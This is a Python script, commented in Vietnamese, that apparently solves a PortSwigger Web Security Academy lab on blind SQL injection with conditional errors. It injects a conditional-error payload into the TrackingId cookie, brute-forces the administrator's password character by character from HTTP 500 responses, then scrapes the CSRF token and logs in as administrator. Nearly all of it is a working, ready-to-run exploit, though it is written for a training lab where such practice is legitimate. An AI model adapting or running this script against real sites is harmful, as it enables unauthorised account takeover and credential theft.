#Lab: Blind SQL injection with conditional errors
import requests
from bs4 import BeautifulSoup

print("Nhập URL giống như này (pls): https://(your-lab-id).web-security-academy.net/ ")
base_url = input("Nhập URL: ").rstrip("/")

session = requests.Session()
res = session.get(base_url)

tracking_id = res.cookies.get("TrackingId")
session_id = res.cookies.get("session")

# Các kí có thể có trong password
charset = "abcdefghijklmnopqrstuvwxyz0123456789"
password = ""

print("[!] Bắt đầu mò mật khẩu...")

for i in range(1, 21): # Duyệt từng vị trí ký tự
    for char in charset:
        # Payload sẽ gây lỗi nếu ký tự đúng -> lỗi HTTP (500)
        payload = tracking_id + f"'||(SELECT CASE WHEN SUBSTR(password,{i},1)='{char}' THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||'"
        cookies = {
            "TrackingId": payload,
            "session": session_id
        }

        res_test = session.get(base_url, cookies=cookies)

        if res_test.status_code == 500 or "Internal Server Error" in res_test.text:
            password += char
            print(f"[+] Tìm thấy ký tự thứ {i}")
            break
    else:
        print("[-] Không tìm được ký tự nào ở vị trí", i)
        break

print(f"\n[+] Password của administrator là: {password}")
print(f"[!] Bắt đầu đăng nhập...")

# Đăng nhập
login_url = f"{base_url}/login"
session = requests.Session()
response = session.get(login_url)
soup = BeautifulSoup(response.text, "html.parser")
csrf = soup.find("input", {"name": "csrf"})["value"]

data = {
    "csrf": csrf,
    "username": "administrator",
    "password": password
}
response = session.post(login_url, data=data)

if (response.status_code == 200):
    print("[+] Ngon, đăng nhập vào được rồi.")
else:
    print("[-] Thua, ca này khó vl bố chịu.")